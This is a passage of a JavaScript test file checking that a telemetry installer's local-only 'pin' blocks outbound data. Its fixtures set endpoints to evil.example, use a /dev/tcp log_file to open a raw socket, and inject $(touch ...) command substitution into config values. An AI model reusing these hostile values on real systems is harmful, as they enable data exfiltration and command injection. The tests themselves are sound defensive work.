  assert.match(result.output, new RegExp(`! Telemetry pinned local-only in \\S+, but a Console endpoint still resolves from TELEMETRY_CONFIG_FILE \\(${explicit.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\)(; [^\\n]*)?, so this install is NOT local-only`));
  assert.doesNotMatch(result.output, /✓ Telemetry pinned local-only/);
});

// --- a typed local-files sink that Console settings blocked names them --------------------------

for (const [label, args, env, named] of [
  ["environment", [], { CONSOLE_URL: GLOBAL_URL }, "CONSOLE_URL in the install environment"],
  ["flag", ["--console-url", GLOBAL_URL], {}, "--console-url"],
]) {
  test(`init summary: a typed local-files sink blocked by a Console ${label} value names it and gives no circular advice`, () => {
    const { home } = homeWithGlobalConf(`blocked-${label}`);
    const dest = path.join(makeFixtureDir(`telemetry-pin-blocked-${label}-dest-`), "ws");
    const result = runInit(["--runtime", "base", "--dest", dest, "--telemetry-sink", "local-files", ...args], home, env);
    assert.equal(result.status, 0, result.output);
    const conf = fs.readFileSync(installedConf(dest), "utf8");
    assert.doesNotMatch(conf, /telemetry_sink_pin/);
    assert.match(conf, /^console_telemetry_url=http:\/\/127\.0\.0\.1:9$/m);
    assert.match(result.output, new RegExp(`NOT recorded: Console settings were also supplied \\(${named.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\), and the pin is written only when none are`));
    assert.doesNotMatch(result.output, /was not updated|was edited after it was installed/);
    assert.doesNotMatch(result.output, /re-run init with `--telemetry-sink local-files`/);
  });
}

// --- one pin grammar for every reader and the remover ---------------------------------------------

const PIN_VARIANTS = [
  ["canonical", (text) => `${text}telemetry_sink_pin=local-files\n`, true],
  ["CRLF", (text) => `${text}telemetry_sink_pin=local-files\r\n`, true],
  ["no trailing newline", (text) => `${text}telemetry_sink_pin=local-files`, true],
  ["leading space", (text) => `${text} telemetry_sink_pin=local-files\n`, false],
  ["space before =", (text) => `${text}telemetry_sink_pin =local-files\n`, false],
  ["space inside the key", (text) => `${text}telemetry _sink_pin=local-files\n`, false],
  ["NBSP before the value", (text) => `${text}telemetry_sink_pin=\u00a0local-files\n`, false],
  ["trailing space", (text) => `${text}telemetry_sink_pin=local-files \n`, false],
  ["UTF-8 BOM", (text) => `\ufefftelemetry_sink_pin=local-files\n${text}`, false],
  ["commented", (text) => `${text}# telemetry_sink_pin=local-files\n`, false],
  ["other value", (text) => `${text}telemetry_sink_pin=local-file\n`, false],
];

function stripPin(text) {
  return text.split("\n").filter((line) => line !== "telemetry_sink_pin=local-files").join("\n");
}

test("every reader applies the same pin grammar: the exact line, with only a trailing CR allowed", () => {
  const { home, file: globalConf } = homeWithGlobalConf("grammar");
  for (const [label, variant, expected] of PIN_VARIANTS) {
    withInstalledConf(pinned.dest, (text) => variant(stripPin(text)), () => {
      const want = real(expected ? installedConf(pinned.dest) : globalConf);
      assert.equal(real(readConfigSh(pinned.dest, { HOME: home }).file), want, `config.sh: ${label}`);
      assert.equal(real(readLivenessWrite(pinned.dest, { HOME: home }).file), want, `liveness-write.js: ${label}`);
      const doctor = readDoctorReport(pinned.dest, { HOME: home });
      assert.equal(real(doctor.telemetry.configFile), want, `telemetry-doctor: ${label}`);
      assert.equal(doctor.telemetry.pinRecorded, expected, `telemetry-doctor pinRecorded: ${label}`);
    });
  }
});

test("the installer's pin remover removes exactly what the readers read as a pin", () => {
  for (const [label, variant, expected] of PIN_VARIANTS) {
    const { ws, conf, script } = telemetryCopy(`remover-${label.replace(/\W+/g, "-")}`);
    const before = variant(fs.readFileSync(conf, "utf8"));
    fs.writeFileSync(conf, before);
    const result = runInstaller(script, [conf, "--telemetry-sink", "local-kontour-console", "--console-tenant", "t1"]);
    assert.equal(result.status, 0, `${label}: ${result.output}`);
    const after = fs.readFileSync(conf, "utf8");
    const lines = after.split("\n");
    assert.equal(lines.some((line) => line === "telemetry_sink_pin=local-files" || line === "telemetry_sink_pin=local-files\r"), false, `${label}: a pin survived`);
    if (!expected) {
      // What no reader treats as a pin is not the remover's to touch.
      const variantLine = before.split("\n").find((line) => line.includes("_pin") || line.includes("sink_pin"));
      assert.ok(lines.includes(variantLine), `${label}: the non-pin line was removed`);
    }
    fs.rmSync(ws, { recursive: true, force: true });
  }
});

// --- never pin the Flow Agents package's own telemetry.conf ---------------------------------------

test("install-console-config.sh never pins the telemetry.conf of the Flow Agents package itself", () => {
  for (const [name, expectPin] of [["@kontourai/flow-agents", false], ["some-consumer-repo", true]]) {
    const { ws, conf, script } = telemetryCopy(`package-${expectPin ? "consumer" : "self"}`);
    fs.writeFileSync(path.join(ws, "package.json"), `${JSON.stringify({ name, version: "1.0.0" })}\n`);
    const result = runInstaller(script, [conf, "--telemetry-sink", "local-files"], { PATH: NODE_PATH });
    assert.equal(result.status, 0, result.output);
    assert.equal(PIN_LINE.test(fs.readFileSync(conf, "utf8")), expectPin, `${name}: ${result.output}`);
    if (!expectPin) assert.match(result.stderr, /not pinning .* local-only: the directory it is in carries the Flow Agents package's package\.json, so it may be the package's own telemetry\.conf .* re-run with --install-destination/);
  }
});

// --- the generated installers run under macOS /bin/bash 3.2 with no Console flag ------------------
//
// Bash before 4.4 treats "${empty[@]}" as unbound under `set -u`. A Console variable in the
// environment with no Console flag reaches install-console-config.sh with an empty argument array.
const bash3 = (() => {
  if (!fs.existsSync("/bin/bash")) return false;
  const version = spawnSync("/bin/bash", ["-c", "echo ${BASH_VERSINFO[0]}"], { encoding: "utf8" }).stdout.trim();
  return version === "3";
})();
const BASH3_SKIP = bash3 ? false : "/bin/bash is not bash 3.x here, so the bash-3.2 empty-array failure cannot be reproduced";

function bash3Path() {
  // `bash` resolves to /bin/bash 3.2 for init's spawnSync("bash", ...) children.
  const dir = makeFixtureDir("telemetry-pin-bash3-bin-");
  fs.symlinkSync("/bin/bash", path.join(dir, "bash"));
  fs.symlinkSync(process.execPath, path.join(dir, "node"));
  return `${dir}:/usr/bin:/bin:/usr/sbin:/sbin`;
}

test("bash 3.2: the bundle install.sh with CONSOLE_URL set and no Console flag exits 0", { skip: BASH3_SKIP }, () => {
  const home = makeFixtureDir("telemetry-pin-bash3-bundle-home-");
  const dest = path.join(makeFixtureDir("telemetry-pin-bash3-bundle-dest-"), "ws");
  const result = spawnSync("/bin/bash", [path.join(repoRoot, "dist", "base", "install.sh"), dest], { env: { HOME: home, PATH: bash3Path(), CONSOLE_URL: GLOBAL_URL }, encoding: "utf8" });
  assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
  assert.doesNotMatch(result.stderr, /unbound variable/);
  assert.match(fs.readFileSync(installedConf(dest), "utf8"), /^console_telemetry_url=http:\/\/127\.0\.0\.1:9$/m);
});

test("bash 3.2: init (project and codex --global) with CONSOLE_URL set and no Console flag exits 0", { skip: BASH3_SKIP }, () => {
  const home = makeFixtureDir("telemetry-pin-bash3-init-home-");
  const env = { HOME: home, PATH: bash3Path(), XDG_CONFIG_HOME: path.join(home, ".config"), CONSOLE_URL: GLOBAL_URL };
  for (const args of [["--runtime", "base"], ["--runtime", "codex", "--global"]]) {
    const dest = path.join(makeFixtureDir("telemetry-pin-bash3-init-dest-"), "ws");
    const result = spawnSync(process.execPath, [cli, "init", ...args, "--dest", dest, "--yes"], { cwd: home, env, encoding: "utf8" });
    assert.equal(result.status, 0, `${args.join(" ")}: ${result.stdout}\n${result.stderr}`);
    // install-codex-home.sh has an EXIT trap, so under bash 3.2 an unbound-variable abort still
    // exits 0: the stderr and the written conf are what show it stopped early.
    assert.doesNotMatch(result.stderr, /unbound variable/, args.join(" "));
    assert.match(fs.readFileSync(installedConf(dest), "utf8"), /^console_telemetry_url=http:\/\/127\.0\.0\.1:9$/m, args.join(" "));
  }
});

test("bash 3.2: the root install.sh with CONSOLE_URL set and no Console flag exits 0", { skip: BASH3_SKIP }, () => {
  // A minimal source tree: the root installer rsyncs its own directory, so copy only what it runs.
  const src = makeFixtureDir("telemetry-pin-bash3-root-src-");
  fs.copyFileSync(path.join(repoRoot, "install.sh"), path.join(src, "install.sh"));
  fs.cpSync(path.join(repoRoot, "scripts", "telemetry"), path.join(src, "scripts", "telemetry"), { recursive: true });
  const home = makeFixtureDir("telemetry-pin-bash3-root-home-");
  const dest = path.join(makeFixtureDir("telemetry-pin-bash3-root-dest-"), "ws");
  const result = spawnSync("/bin/bash", [path.join(src, "install.sh"), dest], { env: { HOME: home, PATH: bash3Path(), CONSOLE_URL: GLOBAL_URL }, encoding: "utf8" });
  assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
  assert.doesNotMatch(result.stderr, /unbound variable/);
  assert.match(fs.readFileSync(installedConf(dest), "utf8"), /^console_telemetry_url=http:\/\/127\.0\.0\.1:9$/m);
});

// --- review round 2: filter what the parser derives, not how the key is spelled -----------------
//
// config.sh turns channel.<name>.<key> into TELEMETRY_CHANNEL_<NAME>_<KEY> (uppercased), so a
// filter on the raw key missed channel.full.Endpoint_Url and channel.analytics_endpoint.url, and
// transport_emit POSTed to both. These run the real transport against a local listener reached
// through http://0.0.0.0:<port>, which the loopback grammar does not accept, so a POST that
// arrives is one the pin failed to stop.
async function emitAndCountPosts(dest, env) {
  const hits = [];
  const server = http.createServer((request, response) => {
    hits.push(request.url);
    response.end("ok");
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  try {
    const script = 'source "$1/scripts/telemetry/lib/config.sh"; source "$1/scripts/telemetry/lib/transport.sh"; transport_emit "{\\"event\\":\\"pin-probe\\"}"; wait';
    const child = spawn("/bin/bash", ["-c", script.replaceAll("PORT", String(port)), "_", dest], { env: { PATH: SHELL_PATH, ...env(port) }, stdio: ["ignore", "ignore", "pipe"] });
    let stderr = "";
    child.stderr.on("data", (chunk) => { stderr += chunk; });
    const status = await new Promise((resolve) => child.on("close", resolve));
    assert.equal(status, 0, stderr);
    return hits;
  } finally {
    server.close();
  }
}

const BYPASS_SPELLINGS = [
  ["channel.full.Endpoint_Url", "/full-mixed-case"],
  ["channel.analytics_endpoint.url", "/analytics-split"],
];

function bypassLines(port) {
  return BYPASS_SPELLINGS.map(([key, urlPath]) => `${key}=http://0.0.0.0:${port}${urlPath}`).join("\n");
}

test("pinned: channel endpoints spelled to slip past a raw-key filter are dropped and never POSTed", async () => {
  const home = makeFixtureDir("telemetry-pin-bypass-home-");
  let port;
  const env = (listenPort) => {
    port = listenPort;
    fs.writeFileSync(installedConf(pinned.dest), `${original}${bypassLines(listenPort)}\n`);
    return { HOME: home };
  };
  const original = fs.readFileSync(installedConf(pinned.dest), "utf8");
  try {
    const hits = await emitAndCountPosts(pinned.dest, env);
    assert.deepEqual(hits, [], `POSTs reached the listener on port ${port}`);
    const vars = readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_ENDPOINT_URL", "TELEMETRY_CHANNEL_ANALYTICS_ENDPOINT_URL"]);
    assert.deepEqual(vars, { TELEMETRY_CHANNEL_FULL_ENDPOINT_URL: "http://localhost:3141/v1/agent-events", TELEMETRY_CHANNEL_ANALYTICS_ENDPOINT_URL: "" });
    const doctor = readDoctorReport(pinned.dest, { HOME: home });
    const endpoints = Object.fromEntries(doctor.telemetry.channels.map((channel) => [channel.name, channel.endpointUrl]));
    assert.deepEqual(endpoints, { full: "http://localhost:3141/v1/agent-events", analytics: undefined }, "telemetry-doctor channel endpoints");
    assert.deepEqual(doctor.telemetry.pinOverrides, []);
  } finally {
    fs.writeFileSync(installedConf(pinned.dest), original);
  }
});

test("unpinned control: the same spellings do reach the transport (the probe can see a POST)", async () => {
  const home = makeFixtureDir("telemetry-pin-bypass-control-home-");
  const original = fs.readFileSync(installedConf(unpinned.dest), "utf8");
  try {
    const hits = await emitAndCountPosts(unpinned.dest, (port) => {
      fs.writeFileSync(installedConf(unpinned.dest), `${original}${bypassLines(port)}\n`);
      return { HOME: home };
    });
    assert.deepEqual(hits.sort(), BYPASS_SPELLINGS.map(([, urlPath]) => urlPath).sort());
    // The doctor reads the same two settings the transport used.
    const doctor = readDoctorReport(unpinned.dest, { HOME: home });
    for (const channel of doctor.telemetry.channels) assert.match(channel.endpointUrl ?? "", /^http:\/\/0\.0\.0\.0:\d+\//, channel.name);
  } finally {
    fs.writeFileSync(installedConf(unpinned.dest), original);
  }
});

test("Console keys spelled in another case are ignored by the parser, pinned or not", () => {
  const home = makeFixtureDir("telemetry-pin-case-home-");
  const lines = `Console_Url=${HOSTILE}\nCONSOLE_URL=${HOSTILE}\nconsole_URL=${HOSTILE}\nConsole_Telemetry_Token=stolen\nCONSOLE_TELEMETRY_ENDPOINT_URL=${HOSTILE}/x\n`;
  for (const dest of [pinned.dest, unpinned.dest]) {
    withInstalledConf(dest, (text) => `${text}${lines}`, () => {
      const vars = readShellVars(dest, { HOME: home }, ["CONSOLE_TELEMETRY_URL", "CONSOLE_TELEMETRY_ENDPOINT_URL", "CONSOLE_TELEMETRY_TOKEN"]);
      assert.deepEqual(vars, { CONSOLE_TELEMETRY_URL: "", CONSOLE_TELEMETRY_ENDPOINT_URL: "", CONSOLE_TELEMETRY_TOKEN: "" }, dest);
      const doctor = readDoctorReport(dest, { HOME: home });
      assert.equal(doctor.console.sink, "local-only", dest);
      assert.equal(readLivenessWrite(dest, { HOME: home }).enabled, false, dest);
    });
  }
});

// --- the doctor resolves values the way config.sh does ------------------------------------------

test("doctor: an empty CONSOLE_TELEMETRY_URL is unset, as in config.sh, so CONSOLE_URL applies and is named", () => {
  const home = makeFixtureDir("telemetry-pin-empty-env-home-");
  const env = { HOME: home, CONSOLE_TELEMETRY_URL: "", CONSOLE_URL: "http://127.0.0.1:7002" };
  assert.equal(readShellVars(pinned.dest, env, ["CONSOLE_TELEMETRY_URL"]).CONSOLE_TELEMETRY_URL, "http://127.0.0.1:7002");
  const report = readDoctorReport(pinned.dest, env);
  assert.equal(report.console.url, "http://127.0.0.1:7002/");
  assert.equal(report.console.endpointSource, "environment variable CONSOLE_URL");
  assert.ok(report.warnings.some((warning) => warning.includes("a Console endpoint still resolves from environment variable CONSOLE_URL")), JSON.stringify(report.warnings));
});

test("doctor: TELEMETRY_CONFIG_FILE's Console URL beats an environment URL, as in config.sh, and is attributed to the file", () => {
  const home = makeFixtureDir("telemetry-pin-precedence-home-");
  const explicit = path.join(makeFixtureDir("telemetry-pin-precedence-"), "explicit.conf");
  writeConf(explicit, "http://127.0.0.1:7001", "explicit-token");
  const env = { HOME: home, TELEMETRY_CONFIG_FILE: explicit, CONSOLE_TELEMETRY_URL: "http://127.0.0.1:7003" };
  assert.equal(readShellVars(pinned.dest, env, ["CONSOLE_TELEMETRY_URL"]).CONSOLE_TELEMETRY_URL, "http://127.0.0.1:7001");
  const report = readDoctorReport(pinned.dest, env);
  assert.equal(report.console.url, "http://127.0.0.1:7001/");
  assert.equal(report.console.endpointSource, `TELEMETRY_CONFIG_FILE (${explicit})`);
  assert.equal(report.console.tokenSource, "config-file");
});

test("doctor: an environment channel endpoint or pricing URL on a pinned install is warned about and named", () => {
  const home = makeFixtureDir("telemetry-pin-env-channel-home-");
  const env = { HOME: home, TELEMETRY_CHANNEL_ANALYTICS_ENDPOINT_URL: "https://evil.example/x", TELEMETRY_CHANNEL_FULL_ENDPOINT_URL: "https://evil.example/full", TELEMETRY_PRICING_URL: "https://evil.example/pricing" };
  const vars = readShellVars(pinned.dest, env, ["TELEMETRY_CHANNEL_ANALYTICS_ENDPOINT_URL", "TELEMETRY_CHANNEL_FULL_ENDPOINT_URL", "TELEMETRY_PRICING_URL"]);
  // The installed conf sets the full channel's (loopback) endpoint itself, which beats the environment.
  assert.deepEqual(vars, { TELEMETRY_CHANNEL_ANALYTICS_ENDPOINT_URL: "https://evil.example/x", TELEMETRY_CHANNEL_FULL_ENDPOINT_URL: "http://localhost:3141/v1/agent-events", TELEMETRY_PRICING_URL: "https://evil.example/pricing" });
  const report = readDoctorReport(pinned.dest, env);
  assert.deepEqual(report.telemetry.pinOverrides.map((override) => [override.what, override.source]), [
    ["the analytics channel endpoint", "environment variable TELEMETRY_CHANNEL_ANALYTICS_ENDPOINT_URL"],
    ["a pricing URL", "environment variable TELEMETRY_PRICING_URL"],
  ]);
  assert.equal(report.warnings.filter((warning) => warning.includes("still resolves from environment variable")).length, 2, JSON.stringify(report.warnings));
});

// --- the root install.sh pins its destination, never its own checkout ---------------------------

test("root install.sh --telemetry-sink local-files pins a destination copied from a package checkout, not the checkout", () => {
  const src = makeFixtureDir("telemetry-pin-root-src-");
  fs.copyFileSync(path.join(repoRoot, "install.sh"), path.join(src, "install.sh"));
  fs.cpSync(path.join(repoRoot, "scripts", "telemetry"), path.join(src, "scripts", "telemetry"), { recursive: true });
  fs.copyFileSync(path.join(repoRoot, "package.json"), path.join(src, "package.json"));
  const home = makeFixtureDir("telemetry-pin-root-home-");
  const env = { HOME: home, PATH: NODE_PATH };
  const dest = path.join(makeFixtureDir("telemetry-pin-root-dest-"), "ws");
  const installed = spawnSync("/bin/bash", [path.join(src, "install.sh"), dest, "--telemetry-sink", "local-files"], { env, encoding: "utf8" });
  assert.equal(installed.status, 0, `${installed.stdout}\n${installed.stderr}`);
  assert.equal(JSON.parse(fs.readFileSync(path.join(dest, "package.json"), "utf8")).name, "@kontourai/flow-agents", "the destination carries the package.json the guard reads");
  assert.match(fs.readFileSync(installedConf(dest), "utf8"), PIN_LINE);
  // Installing a checkout onto itself must still leave its tracked telemetry.conf alone.
  const before = fs.readFileSync(path.join(src, "scripts", "telemetry", "telemetry.conf"), "utf8");
  const self = spawnSync("/bin/bash", [path.join(src, "install.sh"), src, "--telemetry-sink", "local-files"], { env, encoding: "utf8" });
  assert.equal(self.status, 0, `${self.stdout}\n${self.stderr}`);
  assert.equal(fs.readFileSync(path.join(src, "scripts", "telemetry", "telemetry.conf"), "utf8"), before);
  assert.match(self.stderr, /not pinning .* local-only: the directory it is in carries the Flow Agents package's package\.json/);
});

// --- install-codex-home.sh keeps a failure's exit status ----------------------------------------
//
// Before the fix its EXIT trap ended in a successful command, and bash 3.2 hands the trap $? = 0
// after a `set -u` abort on an empty array, so the abort exited 0. The probe below inserts such an
// abort right after the script arms its trap.
function codexHomeCopy(edit) {
  const dir = makeFixtureDir("telemetry-pin-codex-trap-");
  const file = path.join(dir, "install-codex-home.sh");
  fs.writeFileSync(file, edit(fs.readFileSync(path.join(repoRoot, "scripts", "install-codex-home.sh"), "utf8")));
  return { dir, file };
}

test("bash 3.2: install-codex-home.sh exits non-zero when a set -u abort stops it", { skip: BASH3_SKIP }, () => {
  const { dir, file } = codexHomeCopy((text) => {
    const trapLine = /^trap .* EXIT$/m.exec(text);
    assert.ok(trapLine, "install-codex-home.sh arms an EXIT trap");
    const at = trapLine.index + trapLine[0].length;
    return `${text.slice(0, at)}\nFA_PROBE_EMPTY=()\n: "\${FA_PROBE_EMPTY[@]}"${text.slice(at)}`;
  });
  const result = spawnSync("/bin/bash", [file, path.join(dir, "codex-home")], { env: { HOME: dir, PATH: SHELL_PATH }, encoding: "utf8" });
  assert.match(result.stderr, /FA_PROBE_EMPTY\[@\]: unbound variable/);
  assert.notEqual(result.status, 0, "an aborted install must not exit 0");
});

test("install-codex-home.sh still exits 0 for --help and 2 for an unknown option", () => {
  const help = spawnSync("/bin/bash", [path.join(repoRoot, "scripts", "install-codex-home.sh"), "--help"], { env: { HOME: makeFixtureDir("telemetry-pin-codex-help-"), PATH: NODE_PATH }, encoding: "utf8" });
  assert.equal(help.status, 0, help.stderr);
  const unknown = spawnSync("/bin/bash", [path.join(repoRoot, "scripts", "install-codex-home.sh"), "--no-such-option"], { env: { HOME: makeFixtureDir("telemetry-pin-codex-unknown-"), PATH: NODE_PATH }, encoding: "utf8" });
  assert.equal(unknown.status, 2, unknown.stderr);
});

test("liveness-write.js reads a key with inner whitespace as config.sh does", () => {
  const home = makeFixtureDir("telemetry-pin-key-space-home-");
  withInstalledConf(unpinned.dest, (text) => `${text}console _telemetry_url = ${GLOBAL_URL}\n`, () => {
    assert.equal(readShellVars(unpinned.dest, { HOME: home }, ["CONSOLE_TELEMETRY_URL"]).CONSOLE_TELEMETRY_URL, GLOBAL_URL);
    assert.equal(readLivenessWrite(unpinned.dest, { HOME: home }).enabled, true);
  });
});

// --- review round 3: an allowlist, and ordinary paths only ---------------------------------------
//
// transport.sh writes each event with `>> "$log_file"`, and bash turns a write to /dev/tcp/HOST/PORT
// into a TCP connection. A raw TCP listener reached through 0.0.0.0 shows whether one is opened.
async function emitAndCaptureSocket(dest, env) {
  const received = [];
  const server = net.createServer((socket) => socket.on("data", (chunk) => received.push(chunk.toString("utf8"))));
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  try {
    const script = 'source "$1/scripts/telemetry/lib/config.sh"; source "$1/scripts/telemetry/lib/transport.sh"; transport_emit "{\\"event\\":\\"socket-probe\\"}"; wait';
    const child = spawn("/bin/bash", ["-c", script, "_", dest], { env: { PATH: SHELL_PATH, ...env(port) }, stdio: ["ignore", "ignore", "pipe"] });
    let stderr = "";
    child.stderr.on("data", (chunk) => { stderr += chunk; });
    const status = await new Promise((resolve) => child.on("close", resolve));
    assert.equal(status, 0, stderr);
    await new Promise((resolve) => setTimeout(resolve, 200));
    return received.join("");
  } finally {
    server.close();
  }
}

for (const [label, fixture, expectEvent] of [["pinned: the listener receives nothing", () => pinned, false], ["unpinned: the listener receives nothing", () => unpinned, false]]) {
  test(`a channel log_file of /dev/tcp/HOST/PORT, ${label}`, async () => {
    const { dest } = fixture();
    const home = makeFixtureDir("telemetry-pin-devtcp-home-");
    const original = fs.readFileSync(installedConf(dest), "utf8");
    try {
      const received = await emitAndCaptureSocket(dest, (port) => {
        fs.writeFileSync(installedConf(dest), `${original}channel.full.log_file=/dev/tcp/0.0.0.0/${port}\n`);
        return { HOME: home };
      });
      if (expectEvent) assert.match(received, /socket-probe/);
      else assert.equal(received, "", "an event reached the socket");
      if (dest === pinned.dest) {
        const doctor = readDoctorReport(dest, { HOME: home });
        assert.deepEqual(doctor.telemetry.pinIgnored, [{ key: "channel.full.log_file", reason: "not on the pinned allowlist" }]);
      }
    } finally {
      fs.writeFileSync(installedConf(dest), original);
    }
  });
}

test("pinned: no log path is accepted from the installed conf, not even an ordinary absolute one", () => {
  const home = makeFixtureDir("telemetry-pin-paths-home-");
  const ordinary = path.join(fs.realpathSync(makeFixtureDir("telemetry-pin-paths-")), "full.jsonl");
  const defaultLog = readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_LOG_FILE"]).TELEMETRY_CHANNEL_FULL_LOG_FILE;
  assert.match(defaultLog, /\/\.kontourai\/telemetry\/full\.jsonl$/);
  for (const [key, value] of [
    ["channel.full.log_file", ordinary],
    ["channel.full.log_file", path.join(home, ".zshrc")],
    ["channel.full.log_file", "/dev/tcp/0.0.0.0/9"],
    ["channel.analytics_log.file", ordinary],
    ["channel.full.log_file", "relative/full.jsonl"],
  ]) {
    withInstalledConf(pinned.dest, (text) => `${text}${key}=${value}\n`, () => {
      const vars = readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_LOG_FILE", "TELEMETRY_CHANNEL_ANALYTICS_LOG_FILE"]);
      assert.equal(vars.TELEMETRY_CHANNEL_FULL_LOG_FILE, defaultLog, `config.sh: ${key}=${value}`);
      assert.match(vars.TELEMETRY_CHANNEL_ANALYTICS_LOG_FILE, /\/\.kontourai\/telemetry\/analytics\.jsonl$/, `config.sh: ${key}=${value}`);
      const doctor = readDoctorReport(pinned.dest, { HOME: home });
      assert.deepEqual(doctor.telemetry.pinIgnored, [{ key, reason: "not on the pinned allowlist" }], `telemetry-doctor: ${key}=${value}`);
    });
  }
});

test("pinned: the shipped telemetry.conf is entirely on the allowlist", () => {
  const report = readDoctorReport(pinned.dest, { HOME: makeFixtureDir("telemetry-pin-clean-home-") });
  assert.deepEqual(report.telemetry.pinIgnored, []);
});

test("pinned: anything off the allowlist is ignored by config.sh and reported by the doctor", () => {
  const home = makeFixtureDir("telemetry-pin-allowlist-home-");
  const marker = path.join(makeFixtureDir("telemetry-pin-allowlist-marker-"), "ran");
  const lines = [
    // Bash arithmetic runs a $(...) inside a value, so off-grammar values are dropped.
    `max_log_files=a[$(touch ${marker})]`,
    `channels=full,a[$(touch ${marker})]`,
    "enabled=yes",
    "notification_profile=a b",
    "console_telemetry_redact=nothing",
    "some_future_key=1",
    "channel.full.unknown_key=1",
    "pricing_file=relative.json",
  ];
  withInstalledConf(pinned.dest, (text) => `${text}${lines.join("\n")}\n`, () => {
    const vars = readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_MAX_LOG_FILES", "TELEMETRY_CHANNELS", "TELEMETRY_ENABLED", "TELEMETRY_NOTIFICATION_PROFILE", "TELEMETRY_PRICING_FILE", "TELEMETRY_CHANNEL_FULL_UNKNOWN_KEY", "CONSOLE_TELEMETRY_REDACT", "TELEMETRY_CHANNEL_ANALYTICS_REDACT"]);
    const { CONSOLE_TELEMETRY_REDACT: consoleRedact, TELEMETRY_CHANNEL_ANALYTICS_REDACT: analyticsRedact, ...rest } = vars;
    assert.deepEqual(rest, { TELEMETRY_MAX_LOG_FILES: "3", TELEMETRY_CHANNELS: "full,analytics", TELEMETRY_ENABLED: "true", TELEMETRY_NOTIFICATION_PROFILE: "standard", TELEMETRY_PRICING_FILE: "", TELEMETRY_CHANNEL_FULL_UNKNOWN_KEY: "" });
    // console_telemetry_redact was dropped, so the Console redaction falls back to the analytics list.
    assert.equal(consoleRedact, analyticsRedact);
    // Rotation does arithmetic on TELEMETRY_MAX_LOG_FILES; it only runs on a full log, so the same
    // arithmetic is done directly here, after an emit that walks every channel name.
    const run = spawnSync("/bin/bash", ["-c", 'source "$1/scripts/telemetry/lib/config.sh"; source "$1/scripts/telemetry/lib/transport.sh"; transport_emit "{}"; : $(( TELEMETRY_MAX_LOG_FILES - 1 )); wait', "_", pinned.dest], { env: { PATH: SHELL_PATH, HOME: home }, encoding: "utf8" });
    assert.equal(run.status, 0, run.stderr);
    assert.equal(fs.existsSync(marker), false, "a $(...) in a pinned value ran");
    const doctor = readDoctorReport(pinned.dest, { HOME: home });
    assert.deepEqual(doctor.telemetry.pinIgnored.map((entry) => entry.key), ["max_log_files", "channels", "enabled", "notification_profile", "console_telemetry_redact", "some_future_key", "channel.full.unknown_key", "pricing_file"]);
    assert.deepEqual(doctor.telemetry.pinIgnored.map((entry) => entry.reason), [
      "value not allowed for a pinned install", "value not allowed for a pinned install", "value not allowed for a pinned install", "value not allowed for a pinned install",
      "not on the pinned allowlist", "not on the pinned allowlist", "not on the pinned allowlist", "not on the pinned allowlist",
    ]);
  });
});

// --- ASCII whitespace only, in a UTF-8 locale too ------------------------------------------------

test("all three readers treat NBSP and U+2003 as ordinary characters, even under a UTF-8 locale", () => {
  const home = makeFixtureDir("telemetry-pin-unicode-home-");
  const utf8 = { HOME: home, LANG: "en_US.UTF-8", LC_ALL: "en_US.UTF-8" };
  for (const [label, line, bashUrl] of [
    ["NBSP in the key", `console_telemetry_url =${GLOBAL_URL}`, ""],
    ["U+2003 in the key", `console _telemetry_url=${GLOBAL_URL}`, ""],
    ["NBSP-only value", "console_telemetry_url= ", " "],
  ]) {
    withInstalledConf(unpinned.dest, (text) => `${text}${line}\n`, () => {
      assert.equal(readShellVars(unpinned.dest, utf8, ["CONSOLE_TELEMETRY_URL"]).CONSOLE_TELEMETRY_URL, bashUrl, `config.sh: ${label}`);
      assert.equal(readLivenessWrite(unpinned.dest, utf8).enabled, bashUrl !== "", `liveness-write.js: ${label}`);
      assert.equal(readDoctorReport(unpinned.dest, utf8).console.sink, bashUrl !== "" ? "console" : "local-only", `telemetry-doctor: ${label}`);
    });
  }
});

test("pinned + TELEMETRY_CONFIG_FILE with an NBSP key: bash and the doctor agree", () => {
  const home = makeFixtureDir("telemetry-pin-unicode-explicit-home-");
  const explicit = path.join(makeFixtureDir("telemetry-pin-unicode-explicit-"), "explicit.conf");
  fs.writeFileSync(explicit, `console_telemetry_url =http://127.0.0.1:7004\nconsole_url=http://127.0.0.1:7005\n`, { mode: 0o600 });
  const env = { HOME: home, TELEMETRY_CONFIG_FILE: explicit, LANG: "en_US.UTF-8", LC_ALL: "en_US.UTF-8" };
  assert.equal(readShellVars(pinned.dest, env, ["CONSOLE_TELEMETRY_URL"]).CONSOLE_TELEMETRY_URL, "http://127.0.0.1:7005");
  const report = readDoctorReport(pinned.dest, env);
  assert.deepEqual(report.telemetry.pinOverrides.filter((entry) => entry.what === "a Console endpoint").map((entry) => entry.url), ["http://127.0.0.1:7005/api/telemetry/records"]);
});

test("config.sh keeps a value of -n or -e (printf, not echo)", () => {
  const home = makeFixtureDir("telemetry-pin-echo-home-");
  withInstalledConf(unpinned.dest, (text) => `${text}sync_include=-n\nsync_exclude=-e\n`, () => {
    assert.deepEqual(readShellVars(unpinned.dest, { HOME: home }, ["TELEMETRY_SYNC_INCLUDE", "TELEMETRY_SYNC_EXCLUDE"]), { TELEMETRY_SYNC_INCLUDE: "-n", TELEMETRY_SYNC_EXCLUDE: "-e" });
  });
});

// --- the economics and liveness relays a pinned install still runs -------------------------------

test("doctor: environment relay endpoints on a pinned install are reported and named", () => {
  const home = makeFixtureDir("telemetry-pin-relays-home-");
  const cases = [
    [{ FLOW_AGENTS_CONSOLE_ECONOMICS_RELAY: "1", FLOW_AGENTS_CONSOLE_ECONOMICS_ENDPOINT_URL: "https://evil.example/records" }, ["the economics relay", "environment variable FLOW_AGENTS_CONSOLE_ECONOMICS_ENDPOINT_URL", "https://evil.example/records"]],
